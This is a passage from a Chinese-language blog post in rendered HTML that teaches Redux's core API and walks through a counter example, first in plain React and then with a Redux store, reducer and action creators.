composeWithDevTools(applyMiddleware(thunk)))</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"redux\"><a href=\"#redux\" class=\"headerlink\" title=\"redux\"></a>redux</h1><p>作用：集中式管理 react 应用中多个组件共享的状态。</p>\n<h2 id=\"核心api\"><a href=\"#核心api\" class=\"headerlink\" title=\"核心api\"></a>核心api</h2><h3 id=\"createStore\"><a href=\"#createStore\" class=\"headerlink\" title=\"createStore()\"></a>createStore()</h3><p>作用：创建包含指定 reducer 的 store 对象</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(reducer)</span><br></pre></td></tr></table></figure>\n<h3 id=\"store\"><a href=\"#store\" class=\"headerlink\" title=\"store\"></a>store</h3><p>作用：redux 库最核心的管理对象</p>\n<p>它内部维护着：state 和 reducer</p>\n<p>核心方法：<code>getState()</code>、<code>dispatch(action)</code>、<code>subscribe(listener)</code></p>\n<p>编码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store.getState()</span><br><span class=\"line\">store.dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">'INCREMENT'</span>, number&#125;)</span><br><span class=\"line\">store.subscribe(render)</span><br></pre></td></tr></table></figure>\n<h3 id=\"applyMiddleware\"><a href=\"#applyMiddleware\" class=\"headerlink\" title=\"applyMiddleware()\"></a>applyMiddleware()</h3><p>作用：应用上基于 redux 的中间件(插件库)</p>\n<p>编码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span class=\"string\">'redux-thunk'</span> <span class=\"comment\">// redux 异步中间件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(</span><br><span class=\"line\">\tcounter,</span><br><span class=\"line\">    applyMiddleware(thunk) <span class=\"comment\">// 应用上异步中间件</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<h3 id=\"combineReducers\"><a href=\"#combineReducers\" class=\"headerlink\" title=\"combineReducers()\"></a>combineReducers()</h3><p>作用：合并多个 reducer 函数</p>\n<p>编码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export default combineReducers(&#123;</span><br><span class=\"line\">\tuser,</span><br><span class=\"line\">\tchatUser,</span><br><span class=\"line\">\tchat</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-的三个核心概念\"><a href=\"#redux-的三个核心概念\" class=\"headerlink\" title=\"redux 的三个核心概念\"></a>redux 的三个核心概念</h2><h3 id=\"action\"><a href=\"#action\" class=\"headerlink\" title=\"action\"></a>action</h3><p>作用：标识要执行行为的对象</p>\n<p>包含2个方面的属性</p>\n<ul>\n<li>type：标识属性, 值为字符串, 唯一, 必要属性</li>\n<li>XXX：数据属性，值类型任意，可选属性</li>\n</ul>\n<p>例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> action = &#123;</span><br><span class=\"line\">    type: <span class=\"string\">'INCREMENT'</span>,</span><br><span class=\"line\">    data: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Action Creator(创建 Action 的工厂函数)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> increment = <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> (&#123;<span class=\"attr\">type</span>: <span class=\"string\">'INCREMENT'</span>, <span class=\"attr\">data</span>: number&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"reducer\"><a href=\"#reducer\" class=\"headerlink\" title=\"reducer\"></a>reducer</h3><p>作用：根据老的 state 和 action, 产生新的 state 的纯函数</p>\n<p>样例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">counter</span>(<span class=\"params\">state = <span class=\"number\">0</span>, action</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (action.type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'INCREMENT'</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state + action.data</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'DECREMENT'</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state - action.data</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意：返回一个新的状态，不要修改原来的状态</p>\n<h3 id=\"store-1\"><a href=\"#store-1\" class=\"headerlink\" title=\"store\"></a>store</h3><p>将 state,action 与 reducer 联系在一起的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = createStore(reducer)</span><br></pre></td></tr></table></figure>\n<p>此对象的功能：</p>\n<ul>\n<li>getState(): 得到 state</li>\n<li>dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state</li>\n<li>subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用</li>\n</ul>\n<h2 id=\"count计数案例\"><a href=\"#count计数案例\" class=\"headerlink\" title=\"count计数案例\"></a>count计数案例</h2><p>###react实现计数</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  state = &#123;</span><br><span class=\"line\">    count: <span class=\"number\">0</span> <span class=\"comment\">// 定义变量</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"comment\">// 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 同步加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 同步减</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count - number &#125;))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 奇数加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123; <span class=\"comment\">// 异步加</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(<span class=\"function\"><span class=\"params\">state</span> =&gt;</span> (&#123; <span class=\"attr\">count</span>: state.count + number &#125;))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.state.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt;&#123;' '&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"react-redux版本\"><a href=\"#react-redux版本\" class=\"headerlink\" title=\"react_redux版本\"></a>react_redux版本</h2><p><img src=\"/view/posts/a8054c2/react-redux%E8%80%A6%E5%90%88.gif\" alt=\"react-redux耦合\"></p>\n<p>实现思路：</p>\n<p><img src=\"/view/posts/a8054c2/react-redux.png\" alt=\"react-redux\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> App <span class=\"keyword\">from</span> <span class=\"string\">'./App'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> store <span class=\"keyword\">from</span> <span class=\"string\">'./redux/store'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> <span class=\"attr\">store</span>=<span class=\"string\">&#123;store&#125;/</span>&gt;</span>, document.getElementById('root'))</span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">// 给store绑定状态更新的监听</span></span><br><span class=\"line\"><span class=\"xml\">store.subscribe(() =&gt; &#123; // store内部的状态数据发生改变时回调</span></span><br><span class=\"line\"><span class=\"xml\">  // 重新渲染App组件标签</span></span><br><span class=\"line\">  ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('root'))</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/store.js</span></span><br><span class=\"line\"><span class=\"comment\">// redux最核心的管理对象: store</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer) <span class=\"comment\">// 创建store对象内部会第一次调用reducer()得到初始状态值</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/reducer.js</span></span><br><span class=\"line\"><span class=\"comment\">// reducer函数模块: 根据当前state和指定action返回一个新的state</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; INCREMENT, DECREMENT &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./action-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 管理count状态数据的reducer</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">count</span>(<span class=\"params\">state = <span class=\"number\">1</span>, action</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'count()'</span>, state, action)</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (action.type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> INCREMENT:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state + action.data</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DECREMENT:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state - action.data</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> state</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/action-types.js</span></span><br><span class=\"line\"><span class=\"comment\">// 包含n个action type常量名称的模块</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> INCREMENT = <span class=\"string\">'increment'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> DECREMENT = <span class=\"string\">'decrement'</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/action.js</span></span><br><span class=\"line\"><span class=\"comment\">// 包含n个用来创建action的工厂函数(action creator)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; INCREMENT, DECREMENT &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./action-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">增加的action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> increment = <span class=\"function\"><span class=\"params\">number</span> =&gt;</span> (&#123; <span class=\"attr\">type</span>: INCREMENT, <span class=\"attr\">data</span>: number &#125;)</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">减少的action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> decrement = <span class=\"function\"><span class=\"params\">number</span> =&gt;</span> (&#123; <span class=\"attr\">type</span>: DECREMENT, <span class=\"attr\">data</span>: number &#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// App.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"><span class=\"comment\">// 引入 actions，在store.dispatch()触发更新</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement&#125; <span class=\"keyword\">from</span> <span class=\"string\">'./redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    store: PropTypes.object.isRequired</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.store.dispatch(decrement(number))</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.store.getState() % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.store.dispatch(increment(number))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.store.getState()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span 